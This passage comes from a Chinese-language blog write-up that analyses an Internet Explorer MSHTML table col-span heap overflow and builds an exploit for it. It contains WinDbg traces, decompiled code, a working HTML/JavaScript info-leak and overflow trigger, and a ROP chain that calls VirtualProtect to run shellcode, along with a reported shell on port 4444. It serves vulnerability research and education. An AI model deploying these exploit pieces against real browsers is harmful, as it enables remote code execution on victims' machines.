a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0xFFFFFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = <span class="number">-1</span>;</span><br><span class="line">    result = <span class="number">-2147024362</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = a2;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到当第一个参数大于<code>0xFFFFFFFF</code>结果为负值，小于为0，现在传入的为 <code>0x70</code>,故函数执行完成后 <code>eax=0</code>。下面是 <code>mshtml!CImplAry::EnsureSizeWorker</code> 这个函数的注释。<br><img src="http://static.zybuluo.com/dane909/1mdxcyom9jsvtdfuzsmfnbey/2018-07-14_122322.png" alt="2018-07-14_122322.png-83.5kB"><br>跟进函数 <code>_HeapRealloc</code> 发现堆分配的地址保存在 <code>CTableLayout</code> 偏移0x9c处。<br><img src="http://static.zybuluo.com/dane909/ka1p99xec33wshzfh1vmk2om/QQ%E6%88%AA%E5%9B%BE20180714123321.png" alt="QQ截图20180714123321.png-50.6kB"><br>执行完 <code>mshtml!CTableLayout::CalculateMinMax</code> 函数后发现并没有崩溃，所以还存在另一次调用，继续运行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=0824cea8 ecx=00402c02 edx=ffffffff esi=00000000 edi=0468bd54</span><br><span class="line">eip=6809a084 esp=0468ba58 ebp=0468baf4 iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xc:</span><br><span class="line">6809a084 8b5d08          mov     ebx,dword ptr [ebp+8] ss:0023:0468bafc=0824cea8</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=0824cea8 ecx=00402c02 edx=ffffffff esi=00000000 edi=0468bd54</span><br><span class="line">eip=6809a087 esp=0468ba58 ebp=0468baf4 iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xf:</span><br><span class="line">6809a087 56              push    esi</span><br><span class="line">0:005&gt; dd ebx+0x54 L1</span><br><span class="line">0824cefc  00000001</span><br><span class="line">0:005&gt; dd ebx+0x94 L1</span><br><span class="line">0824cf3c  00000004</span><br></pre></td></tr></table></figure></p>
<p>可以看到和上一次相比 <code>ebx+0x94</code> 处的值变成了4，什么时候变的???好像不知道。在 <code>over_trigger</code> 函数里我们已经把 <code>span</code> 的值改成了 <code>1000</code>,但现在还没有变动，说明下面会改动这个值，设置内存断点，观察什么时候会改动。<br><img src="http://static.zybuluo.com/dane909/jqono2jmfs21xxratn37ehmx/QQ%E6%88%AA%E5%9B%BE20180714131942.png" alt="QQ截图20180714131942.png-6.8kB"><br>直接崩溃了，说明并没有对 <code>CTableLayout</code> 的 <code>span</code> 的值做处理。还有在 <code>mshtml!CImplAry::EnsureSizeWorker</code> 下断点并没有停下，说明<code>ebx+0x94</code>的值右移2后和1相等，跳转走了，并没有执行<code>mshtml!CImplAry::EnsureSizeWorker</code> 去分配堆。好像下面没法分析啦，因为崩溃点在 <code>CTableColCalc::AdjustForCol</code> 函数里，所以我们在 <code>mshtml!CTableLayout::CalculateMinMax</code> 调用 <code>CTableColCalc::AdjustForCol</code> 函数前加一个断点，观察参数。实际上并没有直接断在 <code>call</code> 处，为了更清楚的观察，断在了其之前的指令。主要处理指令如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mshtml!CTableLayout::CalculateMinMax+0x519:</span><br><span class="line">6822f43b 8b839c000000    mov     eax,dword ptr [ebx+9Ch] ;存放的是开辟的堆的地址</span><br><span class="line">6822f441 03c1            add     eax,ecx                 ;堆的地址加上之前已经处理的偏移</span><br><span class="line">6822f443 837de400        cmp     dword ptr [ebp-1Ch],0   ;相等</span><br><span class="line">6822f447 8945d8          mov     dword ptr [ebp-28h],eax </span><br><span class="line">6822f44a 741a            je      mshtml!CTableLayout::CalculateMinMax+0x544 (6822f466) ;跳转</span><br><span class="line"></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x52a:</span><br><span class="line">6822f44c 8b4510          mov     eax,dword ptr [ebp+10h]</span><br><span class="line">6822f44f 83f801          cmp     eax,1</span><br><span class="line">6822f452 7e12            jle     mshtml!CTableLayout::CalculateMinMax+0x544 (6822f466)</span><br><span class="line"></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x532:</span><br><span class="line">6822f454 48              dec     eax</span><br><span class="line">6822f455 3945ec          cmp     dword ptr [ebp-14h],eax</span><br><span class="line">6822f458 750c            jne     mshtml!CTableLayout::CalculateMinMax+0x544 (6822f466)</span><br><span class="line"></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x538:</span><br><span class="line">6822f45a 0faf45f4        imul    eax,dword ptr [ebp-0Ch]</span><br><span class="line">6822f45e 8b4dd0          mov     ecx,dword ptr [ebp-30h]</span><br><span class="line">6822f461 2bc8            sub     ecx,eax</span><br><span class="line">6822f463 894df4          mov     dword ptr [ebp-0Ch],ecx</span><br><span class="line"></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x544:</span><br><span class="line">6822f466 ff75c0          push    dword ptr [ebp-40h]</span><br><span class="line">6822f469 8b45cc          mov     eax,dword ptr [ebp-34h]</span><br><span class="line">6822f46c ff750c          push    dword ptr [ebp+0Ch]</span><br><span class="line">6822f46f 8b75d8          mov     esi,dword ptr [ebp-28h] ;堆的地址加上之前已经处理过的偏移</span><br><span class="line">6822f472 ff75f4          push    dword ptr [ebp-0Ch]</span><br><span class="line">6822f475 e8a0151900      call    mshtml!CTableColCalc::AdjustForCol (683c0a1a)</span><br><span class="line">6822f47a ff45ec          inc     dword ptr [ebp-14h] ;最开始为0 每执行一次AdjustForCol函数会加1</span><br><span class="line">6822f47d 8b45ec          mov     eax,dword ptr [ebp-14h]</span><br><span class="line">6822f480 8345dc1c        add     dword ptr [ebp-24h],1Ch ; ebp-24h 存放的是传入AdjustForCol函数的offset最开始为0 每执行一次加1c</span><br><span class="line">6822f484 3b4510          cmp     eax,dword ptr [ebp+10h] ; ebp+10存放的值为3e8即1000,所以可以发现会循环调用1000次AdjustForCol函数</span><br><span class="line">6822f487 7caf            jl      mshtml!CTableLayout::CalculateMinMax+0x516 (6822f438)</span><br></pre></td></tr></table></figure></p>
<p>所以现在还剩下 <code>ebp-c</code> 指向的值是什么还不确定，继续设置内存断点，观察 <code>ebp-c</code> 值的变化(好像又失败了???我操作有问题???)。<br>最后发现 <code>ida</code>显示那个值的类型是 <code>struct CWidthUnitValue *</code> ，所以在查看调用的函数后发现可能是调用 <code>CWidthUnitValue::GetPixelWidth</code> 函数的返回值，加断点观察下。<br><img src="http://static.zybuluo.com/dane909/cg8zwsftoaffweixuhob9qvs/QQ%E6%88%AA%E5%9B%BE20180714145803.png" alt="QQ截图20180714145803.png-90.7kB"><br>跟进函数 <code>CWidthUnitValue::GetPixelWidth</code>。算了，不跟了，跟不动，结果是因为 <code>0x0414114=42765*100</code>。所以来继续分析 <code>AdjustForCol</code> 函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __userpurge CTableColCalc::AdjustForCol(CTableColCalc *<span class="keyword">this</span>@&lt;ecx&gt;, <span class="keyword">const</span> struct CWidthUnitValue **a2@&lt;eax&gt;, <span class="keyword">const</span> struct CWidthUnitValue **a3@&lt;esi&gt;, <span class="keyword">const</span> struct CWidthUnitValue *a4, <span class="keyword">int</span> a5, struct CCalcInfo *a6, <span class="keyword">int</span> a7)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// ST04_4</span></span><br><span class="line"></span><br><span class="line">  v7 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*a2 &amp; <span class="number">0xF</span>;                 <span class="comment">// (unsigned int)*a2=04141149 </span></span><br><span class="line">  a3[<span class="number">6</span>] = *a2;</span><br><span class="line">  <span class="keyword">if</span> ( CUnitValue::IsScalerUnit(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    CUnitValue::SetValue((<span class="keyword">signed</span> <span class="keyword">int</span>)a4, (<span class="keyword">int</span> *)a3 + <span class="number">6</span>, <span class="number">8</span>);<span class="comment">// a3[6] = a3[6]*16|8</span></span><br><span class="line">    a3[<span class="number">1</span>] = a4;                                 <span class="comment">// a3[1]=00414114 </span></span><br><span class="line">    *a3 = a4;                                   <span class="comment">// *a3 = 00414114 </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a6 != (struct CCalcInfo *)<span class="number">1</span> )</span><br><span class="line">      CUnitValue::SetPercent((CUnitValue *)<span class="number">0x64</span>, (<span class="keyword">int</span>)(a3 + <span class="number">6</span>));</span><br><span class="line">    *a3 = (<span class="keyword">const</span> struct CWidthUnitValue *)<span class="number">1</span>;</span><br><span class="line">    a3[<span class="number">1</span>] = *(<span class="keyword">const</span> struct CWidthUnitValue **)(a5 + <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a3[<span class="number">2</span>] = a4;                                   <span class="comment">// a3[2]=00414114 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可能不够形象，直接贴图吧。<br><img src="http://static.zybuluo.com/dane909/pu038llh8yi6duts2vx0amgs/QQ%E6%88%AA%E5%9B%BE20180714153902.png" alt="QQ截图20180714153902.png-6.9kB"><br>实际上完成的功能可以用下面的伪代码表示(参考<code>KK</code>前辈的)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i &lt; SpanSum)</span><br><span class="line">&#123;</span><br><span class="line">	CTableCol* theTableColObj = theTableLayoutObj-&gt;TableElementArray[i*<span class="number">4</span>]</span><br><span class="line">	<span class="keyword">int</span> col_span = theTableColObj-&gt;GetAAspan(); <span class="comment">//获得 col 元素的 span 属性</span></span><br><span class="line"></span><br><span class="line"> 	<span class="comment">//判断 col 元素是否设置了 width 属性</span></span><br><span class="line"> 	<span class="keyword">if</span>(theTableColObj-&gt;CUnitValue::IsNullOrEnum())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;col_span; j++)</span><br><span class="line"> 		&#123;</span><br><span class="line">			<span class="keyword">int</span> cur_offset = (i + j) * <span class="number">0x1C</span></span><br><span class="line">			AdjustForCol@CTableColCalc(&amp;ColTableLayoutBuffer[cur_offset],width)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	i += col_span</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>漏洞很明显了，循环复制，但是后面明显超过了堆的开辟大小，造成溢出</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>因为存在 <code>ASLR</code> 和 <code>DEP</code> 保护，所以必须先泄露地址信息绕过 <code>ASLR</code>，之后通过构造 <code>ROP</code> 链绕过 <code>DEP</code>。</p>
<h3 id="win7-ie8"><a href="#win7-ie8" class="headerlink" title="win7+ie8"></a>win7+ie8</h3><p>泄漏地址信息的脚本如下。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"evil"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>  <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'javascript'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function strtoint(str) &#123;</span></span><br><span class="line"><span class="undefined">	return str.charCodeAt(1)*0x10000 + str.charCodeAt(0);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var free = "EEEE";</span></span><br><span class="line"><span class="xml">while ( free.length <span class="tag">&lt; <span class="attr">500</span> ) <span class="attr">free</span> += <span class="string">free;</span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var string1 = "AAAA";</span></span><br><span class="line"><span class="xml">while ( string1.length <span class="tag">&lt; <span class="attr">500</span> ) <span class="attr">string1</span> += <span class="string">string1;</span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var string2 = "BBBB";</span></span><br><span class="line"><span class="xml">while ( string2.length <span class="tag">&lt; <span class="attr">500</span> ) <span class="attr">string2</span> += <span class="string">string2;</span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var fr = new Array();</span></span><br><span class="line"><span class="undefined">var al = new Array();</span></span><br><span class="line"><span class="undefined">var bl = new Array();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var div_container = document.getElementById("evil");</span></span><br><span class="line"><span class="undefined">div_container.style.cssText = "display:none";</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">for (var i=0; i <span class="tag">&lt; <span class="attr">500</span>; <span class="attr">i</span>+=<span class="string">2)</span> &#123;</span></span></span><br><span class="line"><span class="undefined">	fr[i] = free.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined">	al[i] = string1.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined">	bl[i] = string2.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined">	var obj = document.createElement("button");</span></span><br><span class="line"><span class="undefined">	div_container.appendChild(obj);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">for (var i=200; i<span class="tag">&lt;<span class="name">500;</span> <span class="attr">i</span>+=<span class="string">2</span> ) &#123;</span></span></span><br><span class="line"><span class="undefined">	fr[i] = null;</span></span><br><span class="line"><span class="undefined">	CollectGarbage();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function leak()&#123;</span></span><br><span class="line"><span class="undefined">	var leak_col = document.getElementById("132");</span></span><br><span class="line"><span class="undefined">	leak_col.width = "41";</span></span><br><span class="line"><span class="undefined">	leak_col.span = "19";</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function get_leak() &#123;</span></span><br><span class="line"><span class="undefined">	var str_addr = strtoint(bl[498].substring((0x100-6)/2+11,(0x100-6)/2+13));</span></span><br><span class="line"><span class="undefined">	str_addr = str_addr - 1410704;</span></span><br><span class="line"><span class="undefined">	alert("mshtml addr :"+str_addr.toString(16));</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function trigger_overflow()&#123;</span></span><br><span class="line"><span class="undefined">	var evil_col = document.getElementById("132");</span></span><br><span class="line"><span class="undefined">	evil_col.width = "1178993";</span></span><br><span class="line"><span class="undefined">	evil_col.span = "44";</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">setTimeout(function()&#123;leak()&#125;, 300);</span></span><br><span class="line"><span class="undefined">setTimeout(function()&#123;get_leak()&#125;,700);</span></span><br><span class="line"><span class="undefined">//setTimeout(function()&#123;heapspray()&#125;, 900);</span></span><br><span class="line"><span class="undefined">setTimeout(function()&#123;trigger_overflow()&#125;, 1200);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><code>&lt;col id=&quot;132&quot; width=&quot;41&quot; span=&quot;9&quot; &gt;</code> 会建立 9个<code>0x1c</code>的堆块。之后定义三个长度为 <code>500</code> 的字符串。之后分配三个字符串数组<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line">	fr[i] = free.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line">	al[i] = string1.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line">	bl[i] = string2.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">var</span> obj = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span><br><span class="line">	div_container.appendChild(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>之后利用 <code>BSTR</code> 结构特性完成地址信息泄漏。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_leak</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> str_addr = strtoint(bl[<span class="number">498</span>].substring((<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+<span class="number">11</span>,(<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+<span class="number">13</span>));</span><br><span class="line">    alert(<span class="string">"CButtonLayout addr :"</span>+str_addr.toString(<span class="number">16</span>));</span><br><span class="line">	str_addr = str_addr - <span class="number">1410704</span>;</span><br><span class="line">	alert(<span class="string">"mshtml addr :"</span>+str_addr.toString(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_overflow</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> evil_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">	evil_col.width = <span class="string">"1178993"</span>;</span><br><span class="line">	evil_col.span = <span class="string">"44"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如下图，成功覆盖 <code>BSTR</code> 的长度，之后通过 <code>CButtonLayout</code> 的虚表地址算出 <code>mshtml</code> 的加载基址。<br><img src="http://static.zybuluo.com/dane909/hnap02gjsixvxtm5hctl8j7h/QQ%E6%88%AA%E5%9B%BE20180714180455.png" alt="QQ截图20180714180455.png-12kB"><br>这个和书上不一样的是用的开头四字节的虚表地址来计算偏移，不过不重要，结果都一样。<br><img src="http://static.zybuluo.com/dane909/shl502u8mkftgp93pafmm0l7/QQ%E6%88%AA%E5%9B%BE20180714184432.png" alt="QQ截图20180714184432.png-17.3kB"><br>之后就可以利用泄露出来的 <code>mshtml</code> 地址构造 <code>rop</code> , 绕过 <code>DEP</code>。<br><img src="http://static.zybuluo.com/dane909/z9s7gej7kf045psmj11ln75p/2018-07-14_184651.png" alt="2018-07-14_184651.png-164.4kB"><br>后面利用就是先栈劫持到堆上，之后 <code>VirtualProtect</code> 函数修改内存的可执行性，再控制 <code>eip</code> 到堆上已经布置好的 <code>shellcode</code>。<code>rop</code> 的构造如下。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop1+<span class="string">"%u"</span>+rop2); <span class="comment">// RET</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop3+<span class="string">"%u"</span>+rop4); <span class="comment">// POP EBP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop5+<span class="string">"%u"</span>+rop6); <span class="comment">// XCHG EAX,ESP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop3+<span class="string">"%u"</span>+rop4); <span class="comment">// POP EBP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop3+<span class="string">"%u"</span>+rop4); <span class="comment">// POP EBP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop7+<span class="string">"%u"</span>+rop8); <span class="comment">// POP EBP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u1024%u0000"</span>); <span class="comment">// Size 0x00001024</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop9+<span class="string">"%u"</span>+rop10); <span class="comment">// POP EDX</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u0040%u0000"</span>); <span class="comment">// 0x00000040</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop11+<span class="string">"%u"</span>+rop12); <span class="comment">// POP ECX</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+writable1+<span class="string">"%u"</span>+writable2); <span class="comment">// Writable Location</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop13+<span class="string">"%u"</span>+rop14); <span class="comment">// POP EDI</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop1+<span class="string">"%u"</span>+rop2); <span class="comment">// RET</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop15+<span class="string">"%u"</span>+rop16); <span class="comment">// POP ESI</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+jmpeax1+<span class="string">"%u"</span>+jmpeax2); <span class="comment">// JMP EAX</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop17+<span class="string">"%u"</span>+rop18); <span class="comment">// POP EAX</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+vp1+<span class="string">"%u"</span>+vp2); <span class="comment">// VirtualProtect()</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop19+<span class="string">"%u"</span>+rop20); <span class="comment">// MOV EAX,DWORD PTR DS:[EAX]</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop21+<span class="string">"%u"</span>+rop22); <span class="comment">// PUSHAD</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop23+<span class="string">"%u"</span>+rop24); <span class="comment">// PUSH ESP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u9090%u9090"</span>); <span class="comment">// crap</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u9090%u9090"</span>); <span class="comment">// crap</span></span><br></pre></td></tr></table></figure></p>
<p>给的资料里面有一个 <code>win7-ie-exp.html</code>,执行后会在 <code>4444</code> 端口监听，如下，成功执行。<br><img src="http://static.zybuluo.com/dane909/2t8u5e452lkff3ua3jsis5qe/QQ%E6%88%AA%E5%9B%BE20180714190405.png" alt="QQ截图20180714190405.png-37.5kB"></p>
<h3 id="win7-ie9-10-11"><a href="#win7-ie9-10-11" class="headerlink" title="win7+ie9/10/11"></a>win7+ie9/10/11</h3><p>上面说了<code>win7</code>下 <code>IE8</code> 浏览器的利用，在 <code>IE9</code> 及之后的浏览器中存在 <code>Nozzle</code> 保护机制，并且 <code>ie10</code> 之后 <code>BSTR</code> 分配在 <code>Custom Heap</code> 上，所以上面的利用方法并不适合。</p>
<blockquote>
<p>Nozzle保护机制（IE）：检测是否存在重复可转换成汇编代码的字段，若存在则阻止其内存申请。</p>
</blockquote>
<p><img src="http://static.zybuluo.com/dane909/l4sz0odv1iecxzddjmtcmg3x/QQ%E6%88%AA%E5%9B%BE20180715134938.png" alt="QQ截图20180715134938.png-137.6kB"></p>
